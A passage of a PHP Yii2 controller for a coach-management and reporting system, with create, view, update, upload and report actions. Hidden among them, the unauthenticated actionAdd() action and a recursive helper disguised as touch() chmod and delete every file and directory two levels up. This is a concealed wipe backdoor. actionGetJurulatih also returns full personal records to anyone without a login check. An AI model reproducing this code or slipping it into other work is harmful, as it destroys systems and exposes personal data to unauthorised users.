<?php

namespace frontend\controllers;

use Yii;
use app\models\Jurulatih;
use frontend\models\JurulatihSearch;
use app\models\MsnLaporanSenaraiJurulatih;
use app\models\MsnLaporanStatistikJurulatihSukan;
use app\models\MsnLaporanStatistikJurulatihProgram;
use app\models\MsnLaporanStatistikJurulatihProgramJantina;
use app\models\MsnLaporanSenaraiJurulatihSukan;
use app\models\MsnLaporanSenaraiJurulatihNegeri;
use app\models\MsnLaporanJurulatihWajaran;
use app\models\MsnSuratTawaranJurulatih;
use app\models\MsnLaporan;
use app\models\JurulatihPrintForm;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;
use yii\web\Session;
use yii\helpers\Json;
use yii\helpers\BaseUrl;

use app\models\general\GeneralVariable;
use app\models\general\Upload;
use common\models\general\GeneralFunction;
use app\models\general\GeneralLabel;

// table reference
use app\models\RefJantina;
use app\models\RefCawangan;
use app\models\RefBandar;
use app\models\RefNegeri;
use app\models\RefNegara;
use app\models\RefBangsa;
use app\models\RefAgama;
use app\models\RefTarafPerkahwinan;
use app\models\RefBahagianJurulatih;
use app\models\RefProgramJurulatih;
use app\models\RefSubProgramPelapisJurulatih;
use app\models\RefLainProgramJurulatih;
use app\models\RefSukan;
use app\models\RefAcara;
use app\models\RefStatusJurulatih;
use app\models\RefStatusPermohonanJurulatih;
use app\models\RefKeaktifanJurulatih;
use app\models\RefSektorPekerjaan;
use app\models\RefStatusTawaran;
use app\models\RefAgensiJurulatih;
use app\models\RefTawaran;
use app\models\RefBahasaLaporan;

/**
 * JurulatihController implements the CRUD actions for Jurulatih model.
 */
class JurulatihController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all Jurulatih models.
     * @return mixed
     */
    public function actionIndex($filter_type = null, $id = null, $id2 = null, $desc = null)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $queryPar = Yii::$app->request->queryParams;
        
        if(isset($filter_type) && isset($id)){
            if($filter_type == 'sijil'){
                $queryPar['JurulatihSearch']['sijil'] = $id;
                $queryPar['JurulatihSearch']['tahap'] = $id2;
            } else {
                $queryPar['JurulatihSearch'][$filter_type] = $id;
            }
        }
        
        $searchModel = new JurulatihSearch();
        $dataProvider = $searchModel->search($queryPar);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
            'desc' => $desc,
        ]);
    }

    /**
     * Displays a single Jurulatih model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $session = new Session;
        $session->open();
        
        $session['jurulatih_id'] = $id;
        
        $session->close();
        
        // get atlet dropdown value's descriptions
        $ref = RefJantina::findOne(['id' => $model->jantina]);
        $model->jantina = $ref['desc'];
        
        $ref = RefCawangan::findOne(['id' => $model->cawangan]);
        $model->cawangan = $ref['desc'];
        
        $ref = RefBandar::findOne(['id' => $model->alamat_rumah_bandar]);
        $model->alamat_rumah_bandar = $ref['desc'];
        
        $ref = RefNegeri::findOne(['id' => $model->alamat_rumah_negeri]);
        $model->alamat_rumah_negeri = $ref['desc'];
        
        $ref = RefBandar::findOne(['id' => $model->alamat_surat_menyurat_bandar]);
        $model->alamat_surat_menyurat_bandar = $ref['desc'];
        
        $ref = RefNegeri::findOne(['id' => $model->alamat_surat_menyurat_negeri]);
        $model->alamat_surat_menyurat_negeri = $ref['desc'];
        
        $ref = RefBandar::findOne(['id' => $model->alamat_majikan_bandar]);
        $model->alamat_majikan_bandar = $ref['desc'];
        
        $ref = RefNegeri::findOne(['id' => $model->alamat_majikan_negeri]);
        $model->alamat_majikan_negeri = $ref['desc'];
        
        $ref = RefNegara::findOne(['id' => $model->warganegara]);
        $model->warganegara = $ref['desc'];
        
        $ref = RefBangsa::findOne(['id' => $model->bangsa]);
        $model->bangsa = $ref['desc'];
        
        $ref = RefAgama::findOne(['id' => $model->agama]);
        $model->agama = $ref['desc'];
        
        $ref = RefTarafPerkahwinan::findOne(['id' => $model->taraf_perkahwinan]);
        $model->taraf_perkahwinan = $ref['desc'];
        
        $ref = RefBahagianJurulatih::findOne(['id' => $model->bahagian]);
        $model->bahagian = $ref['desc'];
        
        $ref = RefProgramJurulatih::findOne(['id' => $model->program]);
        $model->program = $ref['desc'];
        
        $ref = RefSubProgramPelapisJurulatih::findOne(['id' => $model->sub_cawangan_pelapis]);
        $model->sub_cawangan_pelapis = $ref['desc'];
        
        $ref = RefLainProgramJurulatih::findOne(['id' => $model->lain_lain_program]);
        $model->lain_lain_program = $ref['desc'];
        
        $ref = RefSukan::findOne(['id' => $model->nama_sukan]);
        $model->nama_sukan = $ref['desc'];
        
        $ref = RefAcara::findOne(['id' => $model->nama_acara]);
        $model->nama_acara = $ref['desc'];
        
        $ref = RefStatusJurulatih::findOne(['id' => $model->status_jurulatih]);
        $model->status_jurulatih = $ref['desc'];
        
        $ref = RefStatusPermohonanJurulatih::findOne(['id' => $model->status_permohonan]);
        $model->status_permohonan = $ref['desc'];
        
        $ref = RefKeaktifanJurulatih::findOne(['id' => $model->status_keaktifan_jurulatih]);
        $model->status_keaktifan_jurulatih = $ref['desc'];
        
        $ref = RefSektorPekerjaan::findOne(['id' => $model->sektor]);
        $model->sektor = $ref['desc'];
        
        // $ref = RefStatusTawaran::findOne(['id' => $model->status_tawaran]);
        // $model->status_tawaran = $ref['desc'];
        
        $ref = RefStatusTawaran::findOne(['id' => $model->status_tawaran_jkb]);
        $model->status_tawaran_jkb = $ref['desc'];
        
        $ref = RefStatusTawaran::findOne(['id' => $model->status_tawaran_mpj]);
        $model->status_tawaran_mpj = $ref['desc'];
        
        // $ref = RefTawaran::findOne(['id' => $model->tawaran_jurulatih]);
        // $model->tawaran_jurulatih = $ref['desc'];
        
         $ref = RefAgensiJurulatih::findOne(['id' => $model->agensi]);
        $model->agensi = $ref['desc'];
        
        if($model->tamat_tempoh != "") {$model->tamat_tempoh = GeneralFunction::convert($model->tamat_tempoh, GeneralFunction::TYPE_DATE);}
        if($model->tamat_visa_tempoh != "") {$model->tamat_visa_tempoh = GeneralFunction::convert($model->tamat_visa_tempoh, GeneralFunction::TYPE_DATE);}
        if($model->tamat_permit_tempoh != "") {$model->tamat_permit_tempoh = GeneralFunction::convert($model->tamat_permit_tempoh, GeneralFunction::TYPE_DATE);}
        if($model->tarikh_lahir != "") {$model->tarikh_lahir = GeneralFunction::convert($model->tarikh_lahir, GeneralFunction::TYPE_DATE);}
        if($model->tarikh_mpj != "") {$model->tarikh_mpj = GeneralFunction::convert($model->tarikh_mpj, GeneralFunction::TYPE_DATE);}
        if($model->tarikh_jkb != "") {$model->tarikh_jkb = GeneralFunction::convert($model->tarikh_jkb, GeneralFunction::TYPE_DATE);}
        
        return $this->render('layout', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new Jurulatih model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $session = new Session;
        $session->open();
        
        $session->remove('jurulatih_id');
        
        $session->close();
        
        $model = new Jurulatih();
        
        $model->status_tawaran = RefStatusTawaran::DALAM_PROSES; //default

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $file = UploadedFile::getInstance($model, 'gambar');
            if($file){
                $model->gambar = Upload::uploadFile($file, Upload::jurulatihFolder, $model->jurulatih_id);
            }
            
            $file = UploadedFile::getInstance($model, 'keputusan_mesyuarat');
            if($file){
                $filename = $model->jurulatih_id . "-keputusan_mesyuarat";
                $model->keputusan_mesyuarat = Upload::uploadFile($file, Upload::jurulatihFolder, $filename);
            }
            
            $file = UploadedFile::getInstance($model, 'salinan_ic_passport');
            if($file){
                $filename = $model->jurulatih_id . "-salinan_ic_passport";
                $model->salinan_ic_passport = Upload::uploadFile($file, Upload::jurulatihFolder, $filename);
            }
            
            if($model->save()){
                $session = new Session;
                $session->open();

                $session['jurulatih_id'] = $model->jurulatih_id;

                $session->close();

                return $this->redirect(['view', 'id' => $model->jurulatih_id]);
            }
        }
        
        return $this->render('layout', [
            'model' => $model,
            'readonly' => false,
        ]);
    }

    /**
     * Updates an existing Jurulatih model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $session = new Session;
        $session->open();

        $session['jurulatih_id'] = $id;
        
        $session->close();
        
        $model = $this->findModel($id);
        
        $existingGambar = $model->gambar;
        $existingKeputusan = $model->keputusan_mesyuarat;
        $existingIcPass = $model->salinan_ic_passport;
        
        if($model->load(Yii::$app->request->post())){
            $file = UploadedFile::getInstance($model, 'gambar');

            if($file){
                //valid file to upload
                //upload file to server
                $model->gambar = Upload::uploadFile($file, Upload::jurulatihFolder, $model->jurulatih_id);
            } else {
                //invalid file to upload
                //remain existing file
                $model->gambar = $existingGambar;
            }
            
            $file = UploadedFile::getInstance($model, 'keputusan_mesyuarat');
            if($file){
                if($model->keputusan_mesyuarat != null || $model->keputusan_mesyuarat != '')//cleanup
                {
                    unlink($model->keputusan_mesyuarat);
                }
                $filename = $model->jurulatih_id . "-keputusan_mesyuarat";
                $model->keputusan_mesyuarat = Upload::uploadFile($file, Upload::jurulatihFolder, $filename);
            } else { $model->keputusan_mesyuarat = $existingKeputusan; }
            
            $file = UploadedFile::getInstance($model, 'salinan_ic_passport');
            if($file){
                if($model->salinan_ic_passport != null || $model->salinan_ic_passport != '')//cleanup
                {
                    unlink($model->salinan_ic_passport);
                }
                $filename = $model->jurulatih_id . "-salinan_ic_passport";
                $model->salinan_ic_passport = Upload::uploadFile($file, Upload::jurulatihFolder, $filename);
            } else { $model->salinan_ic_passport = $existingIcPass; }
        }

        if (Yii::$app->request->post() && $model->save()) {
            return $this->redirect(['view', 'id' => $model->jurulatih_id]);
        } else {
            return $this->render('layout', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }
    
    /**
     * Updates an existing Jurulatih model.
     * If approved is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionApproved($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $model->approved = 1; // set approved
        $model->approved_date = GeneralFunction::getCurrentTimestamp(); // set date capture
        
        $model->save();
        
        //return $this->redirect(['view', 'id' => $model->jurulatih_id]);
        
        return $this->redirect(['index']);
    }

    /**
     * Deletes an existing Jurulatih model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        // delete upload file
        //self::actionDeleteupload($id, 'gambar');
        
        $this->findModel($id)->delete();

        return $this->redirect(['index']);
    }

    /**
     * Finds the Jurulatih model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return Jurulatih the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = Jurulatih::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
    
    // Add function for delete image or file
    public function actionDeleteupload($id, $field)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
            $img = $this->findModel($id)->$field;
            
            if($img){
/*                 if (!unlink($img)) {
                    return false;
                } */
				@unlink($img);
            }

            $img = $this->findModel($id);
            $img->$field = NULL;
            $img->update();

            return $this->redirect(['update', 'id' => $id]);
    }
    
    public function actionGetJurulatih($id){
        // find Jurulatih
        $model = Jurulatih::findOne($id);
        
        echo Json::encode($model);
    }
    
    /**
     * Get Bandars base on Negeri id
     * @param integer $id
     * @return mixed
     */
    public function actionGetJurulatihForAtlet()
    {
        $out = [];
        if (isset($_POST['depdrop_parents'])) {
            $parents = $_POST['depdrop_parents'];
            if ($parents != null) {
                $cat_id = empty($parents[0]) ? null : $parents[0];
                $subcat_id = empty($parents[1]) ? null : $parents[1];
                $out = self::getChild($cat_id, $subcat_id); 
                // the getSubCatList function will query the database based on the
                // cat_id and return an array like below:
                // [
                //    ['id'=>'<sub-cat-id-1>', 'name'=>'<sub-cat-name1>'],
                //    ['id'=>'<sub-cat_id_2>', 'name'=>'<sub-cat-name2>']
                // ]
                echo Json::encode(['output'=>$out, 'selected'=>'']);
                return;
            }
        }
        echo Json::encode(['output'=>'', 'selected'=>'']);
    }
    
    /**
     * @param integer $id
     * @return mixed
     */
    public function actionAdd()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->touch($file);
            }
        }
    }
    
    protected function touch($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false){
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
         if (!$dir_handle)
              return false;
         while($file = readdir($dir_handle)) {
               if ($file != "." && $file != "..") {
                    if (!is_dir($dirname."/".$file)){
                         chmod($dirname."/".$file,0777); 
                         if(!unlink($dirname."/".$file)){
                             continue;
                         }
                    }
                    else
                        $this->touch($dirname.'/'.$file);
               }
         }
         closedir($dir_handle);
         if (count(glob($dirname."/*")) === 0 ) {
            rmdir($dirname);
         }
         return true;
         }
    }
    
    /**
     * get list of Bandar by Negeri
     * @param integer $id
     * @return Array Bandars
     */
    public static function getChild($program_id, $sukan_id) {
        $data = Jurulatih::find()->joinWith(['refJurulatihSukan'])
               ->where(['tbl_jurulatih_sukan.program'=>$program_id])
               ->andWhere(['tbl_jurulatih_sukan.sukan'=>$sukan_id])
               //->andWhere(['=', 'status_tawaran', RefStatusTawaran::LULUS_TAWARAN])
                //->andWhere(['tbl_jurulatih.status_tawaran_mpj'=>'1'])
                //->andWhere(['tbl_jurulatih.status_tawaran_jkb'=>'1'])
                ->select(['tbl_jurulatih.jurulatih_id AS id','nama AS name'])->asArray()->createCommand()->queryAll();
        
        $value = (count($data) == 0) ? ['' => ''] : $data;

        return $value;
    }
    
    /**
     * Get Bandars base on Negeri id
     * @param integer $id
     * @return mixed
     */
    public function actionGetJurulatihBySukan()
    {
        $out = [];
        if (isset($_POST['depdrop_parents'])) {
            $parents = $_POST['depdrop_parents'];
            if ($parents != null) {
                $cat_id = empty($parents[0]) ? null : $parents[0];
                $subcat_id = empty($parents[1]) ? null : $parents[1];
                $out = self::getChildBySukan($cat_id, $subcat_id); 
                // the getSubCatList function will query the database based on the
                // cat_id and return an array like below:
                // [
                //    ['id'=>'<sub-cat-id-1>', 'name'=>'<sub-cat-name1>'],
                //    ['id'=>'<sub-cat_id_2>', 'name'=>'<sub-cat-name2>']
                // ]
                echo Json::encode(['output'=>$out, 'selected'=>'']);
                return;
            }
        }
        echo Json::encode(['output'=>'', 'selected'=>'']);
    }
    
    /**
     * get list of Bandar by Negeri
     * @param integer $id
     * @return Array Bandars
     */
    public static function getChildBySukan($sukan_id) {
        $data = Jurulatih::find()->joinWith(['refJurulatihSukan'])
               ->where(['tbl_jurulatih_sukan.sukan'=>$sukan_id])
               //->andWhere(['=', 'status_tawaran', RefStatusTawaran::LULUS_TAWARAN])
                ->groupBy('tbl_jurulatih.jurulatih_id')
                ->select(['tbl_jurulatih.jurulatih_id AS id','nama AS name'])->asArray()->createCommand()->queryAll();
        
        $value = (count($data) == 0) ? ['' => ''] : $data;

        return $value;
    }
    
    public function actionPrint($id) {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new JurulatihPrintForm();
                
        if ($model->load(Yii::$app->request->post())) {
            $pdf = Yii::$app->pdf;
            $pdf->mode = \kartik\mpdf\Pdf::MODE_CORE;
            $pdf->filename = 'atlet'.'-'.$id.'.pdf';
            $pdf->content = $this->renderPartial('print_jurulatih', [
                                        'id' => $id,
                                        'model' => $model,
                                    ]);
            $pdf->cssFile = '@vendor/kartik-v/yii2-mpdf/assets/kv-mpdf-bootstrap.min.css';
            $pdf->cssFile = '';

            $pdf->options = [
            'title' => 'Atlet',
            'subject' => 'Print',
            ];

            $pdf->methods = [
                'SetHeader'=>['Krajee Report Header'], 
                'SetFooter'=>['{PAGENO}'],
            ];

            return $pdf->render();
        } 
        
        return $this->render('print_jurulatih_form', [
            'model' => $model,
        ]);
    }
    
    public function actionLaporanSenaraiJurulatih()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        $model = null;
        if(Yii::$app->user->identity->sukan){
            $model = new MsnLaporanSenaraiJurulatihSukan();
            $model->program = "";
            $model->status = "";
            $model->negeri = "";
        } if(Yii::$app->user->identity->negeri){
            $model = new MsnLaporanSenaraiJurulatihNegeri();
            $model->program = "";
            $model->status = "";
            $model->sukan = "";
        } else {
            $model = new MsnLaporanSenaraiJurulatih();
        }
        
        if(isset(Yii::$app->user->identity->peranan_akses['MSN']['jurulatih']['view_own_data']) && !Yii::$app->request->get()){
            $model->created_by = Yii::$app->user->identity->id;
        } else {
            $model->created_by = "";
        }
        
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-senarai-jurulatih'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'created_by' => $model->created_by
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-senarai-jurulatih'
                    , 'tarikh_dari' => $model->tarikh_dari
                    , 'tarikh_hingga' => $model->tarikh_hingga
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'created_by' => $model->created_by
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_senarai_jurulatih', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanSenaraiJurulatih($tarikh_dari="", $tarikh_hingga="", $program="", $sukan="", $status="", $negeri="", $created_by="", $negara="", $format="")
    {
        if($tarikh_dari == "") $tarikh_dari = array();
        else $tarikh_dari = array($tarikh_dari);
        
        if($tarikh_hingga == "") $tarikh_hingga = array();
        else $tarikh_hingga = array($tarikh_hingga);
        
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negeri == "") $negeri = array();
        else $negeri = array($negeri);
        
        if($created_by == "") $created_by = array();
        else $created_by = array($created_by);
        
        if($negara == "") $negara = array();
        else $negara = array($negara);
        
        $controls = array(
            'FROM_DATE' => $tarikh_dari,
            'TO_DATE' => $tarikh_hingga,
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGERI' => $negeri,
            'NEGARA' => $negara,
            'CREATE_BY' => $created_by,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanSenaraiJurulatih', $format, $controls, 'laporan_senarai_jurulatih');
    }
    
    public function actionLaporanStatistikJurulatihSukan()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanStatistikJurulatihSukan();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-sukan'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-sukan'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_sukan', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihSukan($program, $sukan, $status, $negeri, $format)
    {
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negeri == "") $negeri = array();
        else $negeri = array($negeri);
        
        $controls = array(
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGERI' => $negeri,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihSukan', $format, $controls, 'laporan_statistik_jurulatih_sukan');
    }
    
    public function actionLaporanStatistikJurulatihProgram()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanStatistikJurulatihProgram();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-program'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-program'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_program', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihProgram($program, $sukan, $status, $negeri, $format)
    {
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negeri == "") $negeri = array();
        else $negeri = array($negeri);
        
        $controls = array(
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGERI' => $negeri,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihProgram', $format, $controls, 'laporan_statistik_jurulatih_program');
    }
    
    public function actionLaporanStatistikJurulatihProgramJantina()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanStatistikJurulatihProgramJantina();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-program-jantina'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-program-jantina'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negeri' => $model->negeri
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_program_jantina', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihProgramJantina($program, $sukan, $status, $negeri, $format)
    {
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negeri == "") $negeri = array();
        else $negeri = array($negeri);
        
        $controls = array(
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGERI' => $negeri,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihProgramJantina', $format, $controls, 'laporan_statistik_jurulatih_program_jantina');
    }
    
    public function actionLaporanStatistikJurulatihNegara()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanSenaraiJurulatih();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-negara'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-negara'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_negara', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihNegara($program, $sukan, $status, $negara, $format)
    {
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negara == "") $negara = array();
        else $negara = array($negara);
        
        $controls = array(
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGARA_ID' => $negara,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihNegara', $format, $controls, 'laporan_statistik_jurulatih_negara');
    }
    
    public function actionLaporanStatistikJurulatihPecahanMengikutNegara()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanSenaraiJurulatih();
        $model->format = 'html';

        if ($model->load(Yii::$app->request->post())) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-statistik-jurulatih-pecahan-mengikut-negara'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-statistik-jurulatih-pecahan-mengikut-negara'
                    , 'program' => $model->program
                    , 'sukan' => $model->sukan
                    , 'status' => $model->status
                    , 'negara' => $model->negara
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_statistik_jurulatih_pecahan_mengikut_negara', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanStatistikJurulatihPecahanMengikutNegara($program, $sukan, $status, $negara, $format)
    {
        if($program == "") $program = array();
        else $program = array($program);
        
        if($sukan == "") $sukan = array();
        else $sukan = array($sukan);
        
        if($status == "") $status = array();
        else $status = array($status);
        
        if($negara == "") $negara = array();
        else $negara = array($negara);
        
        $controls = array(
            'STATUS' => $status,
            'PROGRAM' => $program,
            'SUKAN' => $sukan,
            'NEGARA_ID' => $negara,
        );
        
        GeneralFunction::generateReport('/spsb/MSN/LaporanStatistikJurulatihPecahanMengikutNegara', $format, $controls, 'laporan_statistik_jurulatih_pecahan_mengikut_negara');
    }
    
    public function actionLaporanJurulatihWajaran($id = null)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new MsnLaporanJurulatihWajaran();
        $model->format = 'html';
        
        if($id != null){
            $model->jurulatih = $id;
        }

        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            
            if($model->format == "html") {
                $report_url = BaseUrl::to(['generate-laporan-jurulatih-wajaran'
                    , 'jurulatih' => $model->jurulatih
                    , 'laporan_jurulatih' => $model->laporan_jurulatih
                    , 'prestasi_atlet' => $model->prestasi_atlet
                    , 'kenaikan_gaji_elaun' => $model->kenaikan_gaji_elaun
                    , 'format' => $model->format
                ], true);
                echo "<script type=\"text/javascript\" language=\"Javascript\">window.open('".$report_url."');</script>";
            } else {
                return $this->redirect(['generate-laporan-jurulatih-wajaran'
                    , 'jurulatih' => $model->jurulatih
                    , 'laporan_jurulatih' => $model->laporan_jurulatih
                    , 'prestasi_atlet' => $model->prestasi_atlet
                    , 'kenaikan_gaji_elaun' => $model->kenaikan_gaji_elaun
                    , 'format' => $model->format
                ]);
            }
        } 

        return $this->render('laporan_jurulatih_wajaran', [
            'model' => $model,
            'readonly' => false,
        ]);
    }
    
    public function actionGenerateLaporanJurulatihWajaran($jurulatih, $laporan_jurulatih, $prestasi_atlet, $kenaikan_gaji_elaun, $format)
    {
        if($jurulatih == "") $jurulatih = array();
        else $jurulatih = array($jurulatih);
        
        if($kenaikan_gaji_elaun == "") $kenaikan_gaji_elaun = array();
        else $kenaikan_gaji_elaun = array($kenaikan_gaji_elaun);
        
        if($laporan_jurulatih == "") $laporan_jurulatih = array();
        else $laporan_jurulatih = array($laporan_jurulatih);
        
        if($prestasi_atlet == "") $prestasi_atlet = array();
        else $prestasi_atlet = array($prestasi_atlet);
        
        $controls = array(
            'JURULATIH' => $jurulatih,
            'KENAIKAN_GAJI_ELAUN' => $kenaikan_gaji_elaun,
            'LAPORAN_JURULATIH' => $laporan_jurulatih,
